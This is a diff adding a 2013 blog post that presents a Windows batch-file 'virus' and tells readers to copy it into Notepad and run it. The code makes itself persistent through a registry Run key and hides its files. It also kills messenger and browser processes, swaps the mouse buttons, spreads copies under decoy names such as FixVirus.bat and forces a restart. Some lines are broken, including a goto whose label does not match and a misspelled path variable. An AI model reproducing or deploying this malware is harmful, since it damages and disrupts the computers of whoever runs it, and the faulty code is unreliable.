@@ -1,0 +1,30 @@
+---
+layout: post
+title: Badass Windows Virus created using Notepad
+date: 2013-04-30 13:56:21.000000000 +02:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Linux/Ubuntu
+tags:
+- Virus
+meta:
+  _publicize_pending: '1'
+author:
+  login: mpho112
+  email: mpho112@gmail.com
+  display_name: Mpho
+  first_name: ''
+  last_name: ''
+---
+<p><strong>Here is a Batch File virus which can:</strong><b></b></p>
+<p><em>Link:</em><span style="text-decoration:underline;"><em> <a href="http://www.makeuseof.com/tag/write-simple-batch-bat-file/" target="_blank">How to create a batch file.</a></em></span></p>
+<div>1.Copy itself into startup<br />2.Copy itself over one thousand times into random spots in your computer.<br />3.Hide its self and all other created files<br />4.Task kill MSN, Norton, Windows Explorer, Limewire.<br />5.Swap the left mouse button with the right one<br />6.Opens alert boxes<br />7.Changes the time to 12:00 and shuts down the computer<br />copy this code into notepad and save as Greatgame.bat(while saving select all files instead of text ).<br />Here is the Code:</div>
+<div>------------- </div>
+<div> </div>
+<div>@Echo off<br />color 4<br />title 4<br />title R.I.P<br />start<br />start<br />start<br />start calc<br />copy %0 %Systemroot%\Greatgame &gt; nul<br />reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Greatgame /t REG_SZ<br />/d %systemroot%\Greatgame.bat /f &gt; nul<br />copy %0 *.bat &gt; nul<br />Attrib +r +h Greatgame.bat<br />Attrib +r +h<br />RUNDLL32 USER32.DLL.SwapMouseButton<br />start calc<br />cls<br />tskill msnmsgr<br />tskill LimeWire<br />tskill iexplore<br />tskill NMain<br />start<br />cls<br />cd %userprofile%\desktop<br />copy Greatgame.bat R.I.P.bat<br />copy Greatgame.bat R.I.P.jpg<br />copy Greatgame.bat R.I.P.txt<br />copy Greatgame.bat R.I.P.exe<br />copy Greatgame.bat R.I.P.mov<br />copy Greatgame.bat FixVirus.bat<br />cd %userprofile%My Documents<br />copy Greatgame.bat R.I.P.bat<br />copy Greatgame.bat R.I.P.jpg<br />copy Greatgame.bat R.I.P.txt<br />copy Greatgame.bat R.I.P.exe<br />copy Greatgame.bat R.I.P.mov<br />copy Greatgame.bat FixVirus.bat<br />start<br />start calc<br />cls<br />msg * R.I.P<br />msg * R.I.P<br />shutdown -r -t 10 -c "VIRUS DETECTED"<br />start<br />start<br />time 12:00<br />:R.I.P<br />cd %usernameprofile%\desktop<br />copy Greatgame.bat %random%.bat<br />goto RIP</div>
+<p> </p>
+<div> </div>
